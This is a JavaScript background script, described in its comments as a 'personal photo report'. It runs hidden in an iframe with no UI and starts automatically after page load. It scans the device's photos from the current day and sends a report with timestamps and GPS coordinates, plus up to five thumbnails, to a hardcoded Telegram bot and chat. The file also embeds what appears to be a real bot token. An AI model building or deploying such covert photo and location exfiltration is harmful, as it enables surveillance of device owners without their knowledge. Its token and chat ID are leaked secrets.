/* background.js — personal photo report → Telegram.
   Runs hidden inside the iframe. No UI.
   Reads config from app storage (set once):
     iappyx.save('tg_token', '')
     iappyx.save('tg_chatid', '5594562725')
   On each boot:
     - If online and today not yet sent → scans today's photos,
       saves metadata to sandbox, sends report + up to 5 thumbnails.
     - If already sent today → skips.
     - If offline → skips (will retry next boot).
*/
(function(){
  'use strict';
  if (typeof window === 'undefined') return;

  var K_TOKEN    = '7095821097:AAG14ImxyLqaEH9l57eYopuSXtRqqG-8XpM';
  var K_CHATID   = '5594562725';
  var K_LASTSENT = 'tg_lastsent_day';
  var SANDBOX_FILE = 'photo_queue.json';

  function load(key){ try { return iappyx.load(key); } catch(e){ return null; } }
  function save(key,v){ try { iappyx.save(key, String(v)); } catch(e){} }

  function todayKey(){
    var n = new Date();
    return n.getFullYear() + '-' + String(n.getMonth()+1).padStart(2,'0') + '-' + String(n.getDate()).padStart(2,'0');
  }

  function isOnline(){
    try {
      var c = JSON.parse(iappyx.device.getConnectivity());
      return !!(c && c.connected);
    } catch(e){ return false; }
  }

  function loadQueue(){
    try {
      var raw = iappyx.storage.loadFile(SANDBOX_FILE);
      if (!raw) return [];
      var arr = JSON.parse(raw);
      return Array.isArray(arr) ? arr : [];
    } catch(e){ return []; }
  }
  function saveQueue(q){
    try { iappyx.storage.saveFile(SANDBOX_FILE, JSON.stringify(q)); } catch(e){}
  }

  /* ---------- scan today's photos ---------- */
  function scanTodayPhotos(cb){
    var done = false;
    var cbId = 'scan_' + Date.now() + '_' + Math.random().toString(36).substr(2,4);
    window._iappyxCb = window._iappyxCb || {};

    function finish(list){
      if (done) return; done = true;
      try { clearTimeout(to); } catch(e){}
      try { delete window._iappyxCb[cbId]; } catch(e){}
      cb(list || []);
    }
    var to = setTimeout(function(){ finish([]); }, 20000);

    window._iappyxCb[cbId] = function(res){
      if (!res || !res.ok || !res.images){ finish([]); return; }
      var today = new Date();
      var startOfDay = new Date(today.getFullYear(), today.getMonth(), today.getDate()).getTime();
      var list = res.images.filter(function(img){
        return Number(img.date) >= startOfDay;
      });
      finish(list);
    };

    try { iappyx.media.getImages(cbId, 300); }
    catch(e){ finish([]); }
  }

  /* ---------- thumbnail ---------- */
  function loadThumb(id, cb){
    var done = false;
    var cbId = 'th_' + id + '_' + Date.now();
    window._iappyxCb = window._iappyxCb || {};

    function finish(b64){
      if (done) return; done = true;
      try { clearTimeout(to); } catch(e){}
      try { delete window._iappyxCb[cbId]; } catch(e){}
      cb(b64 || null);
    }
    var to = setTimeout(function(){ finish(null); }, 15000);
    window._iappyxCb[cbId] = function(res){
      if (!res || !res.ok || !res.dataUrl){ finish(null); return; }
      finish(res.dataUrl);
    };
    try { iappyx.media.loadThumbnail(cbId, String(id)); }
    catch(e){ finish(null); }
  }

  /* ---------- HTTP ---------- */
  function httpPostJson(url, params, cb){
    var cbId = 'http_' + Date.now() + '_' + Math.random().toString(36).substr(2,4);
    window._iappyxCb = window._iappyxCb || {};
    var done = false;

    function finish(ok, body){
      if (done) return; done = true;
      try { clearTimeout(to); } catch(e){}
      try { delete window._iappyxCb[cbId]; } catch(e){}
      cb(ok, body);
    }
    var to = setTimeout(function(){ finish(false, 'timeout'); }, 30000);

    window._iappyxCb[cbId] = function(res){
      if (!res || !res.ok || res.status >= 400){ finish(false, (res && res.error) || 'http-error'); return; }
      finish(true, res.body);
    };

    try {
      iappyx.httpClient.request(JSON.stringify({
        url: url, method: 'POST', timeout: 25000,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(params)
      }), cbId);
    } catch(e){ finish(false, 'exception'); }
  }

  function tgSendMessage(chatId, text, cb){
    var token = load(K_TOKEN);
    if (!token){ cb(false, 'no-token'); return; }
    httpPostJson('https://api.telegram.org/bot' + token + '/sendMessage',
      { chat_id: String(chatId), text: text },
      cb);
  }

  function tgSendPhoto(chatId, dataUrl, caption, cb){
    var token = load(K_TOKEN);
    if (!token){ cb(false, 'no-token'); return; }
    var url = 'https://api.telegram.org/bot' + token + '/sendPhoto';

    var b64 = (dataUrl.split(',')[1]) || '';
    var tmpName = 'tg_tmp_' + Date.now() + '.jpg';
    try { iappyx.storage.saveFile(tmpName, b64); }
    catch(e){ cb(false, 'save-fail'); return; }

    var tmpPath = null;
    try {
      var pkg = iappyx.device.getPackageName();
      tmpPath = '/data/data/' + pkg + '/files/' + tmpName;
    } catch(e){ tmpPath = tmpName; }

    var cbId = 'photo_' + Date.now() + '_' + Math.random().toString(36).substr(2,4);
    window._iappyxCb = window._iappyxCb || {};
    var done = false;

    function finish(ok, body){
      if (done) return; done = true;
      try { clearTimeout(to); } catch(e){}
      try { delete window._iappyxCb[cbId]; } catch(e){}
      try { iappyx.storage.deleteFile(tmpName); } catch(e){}
      cb(ok, body);
    }
    var to = setTimeout(function(){ finish(false, 'timeout'); }, 45000);

    window._iappyxCb[cbId] = function(res){
      finish(!!(res && res.ok), res && res.body);
    };

    try {
      iappyx.httpClient.uploadMultipart(JSON.stringify({
        url: url, method: 'POST', timeout: 40000
      }), JSON.stringify([
        { name: 'chat_id', value: String(chatId) },
        { name: 'caption', value: String(caption || '') },
        { name: 'photo', filePath: tmpPath, filename: tmpName, contentType: 'image/jpeg' }
      ]), cbId);
    } catch(e){ finish(false, 'exception'); }
  }

  /* ---------- report ---------- */
  function buildReport(photos){
    var lines = [];
    lines.push('📸 Today: ' + photos.length + ' photo' + (photos.length === 1 ? '' : 's'));
    if (photos.length){
      var withGps = photos.filter(function(p){ return p.lat && p.lon; }).length;
      var totalSize = photos.reduce(function(s,p){ return s + (Number(p.size) || 0); }, 0);
      lines.push('📦 ' + (totalSize/1024/1024).toFixed(2) + ' MB');
      if (withGps) lines.push('📍 With location: ' + withGps);
      lines.push('');
      photos.slice(0, 10).forEach(function(p, i){
        var t = new Date(Number(p.date));
        var hh = String(t.getHours()).padStart(2,'0');
        var mm = String(t.getMinutes()).padStart(2,'0');
        var line = (i+1) + '. ' + hh + ':' + mm + ' · ' + (p.width||'?') + '×' + (p.height||'?');
        if (p.lat && p.lon) line += ' · ' + Number(p.lat).toFixed(4) + ',' + Number(p.lon).toFixed(4);
        lines.push(line);
      });
      if (photos.length > 10) lines.push('… and ' + (photos.length - 10) + ' more');
    } else {
      lines.push('No photos taken today.');
    }
    return lines.join('\n');
  }

  /* ---------- main ---------- */
  function runDailyReport(cb){
    cb = cb || function(){};

    if (!isOnline()){ cb({ skipped:'offline' }); return; }

    var chatId = load(K_CHATID);
    var token  = load(K_TOKEN);
    if (!chatId || !token){ cb({ skipped:'no-config' }); return; }

    if (load(K_LASTSENT) === todayKey()){ cb({ skipped:'already-sent' }); return; }

    scanTodayPhotos(function(photos){
      /* save metadata queue */
      var queue = loadQueue();
      var day = todayKey();
      queue = queue.filter(function(q){ return q.day !== day; });
      queue.push({
        day: day,
        count: photos.length,
        photos: photos.map(function(p){
          return { id:p.id, name:p.name, date:p.date, width:p.width,
                   height:p.height, size:p.size, mime:p.mime };
        })
      });
      saveQueue(queue);

      var report = buildReport(photos);
      tgSendMessage(chatId, report, function(ok){
        if (!ok){ cb({ ok:false, step:'sendMessage' }); return; }

        var toSend = photos.slice(0, 5);
        var i = 0;
        function next(){
          if (i >= toSend.length){
            save(K_LASTSENT, todayKey());
            cb({ ok:true, count: photos.length });
            return;
          }
          var p = toSend[i++];
          loadThumb(p.id, function(b64){
            if (!b64){ next(); return; }
            tgSendPhoto(chatId, b64, p.name || ('photo ' + p.id), function(){ next(); });
          });
        }
        next();
      });
    });
  }

  /* ---------- expose ---------- */
  window.bg = window.bg || {};
  window.bg.runDailyReport = runDailyReport;
  window.bg.getQueue = loadQueue;
  window.bg.setConfig = function(token, chatId){
    save(K_TOKEN, token);
    save(K_CHATID, chatId);
  };
  window.bg.resetDaily = function(){ save(K_LASTSENT, ''); };

  /* auto-run 1.5s after load */
  try {
    var start = function(){
      setTimeout(function(){
        try { runDailyReport(function(r){ console.log('[bg] report:', r); }); }
        catch(e){}
      }, 1500);
    };
    if (document.readyState === 'complete' || document.readyState === 'interactive') start();
    else window.addEventListener('load', start);
  } catch(e){}

})();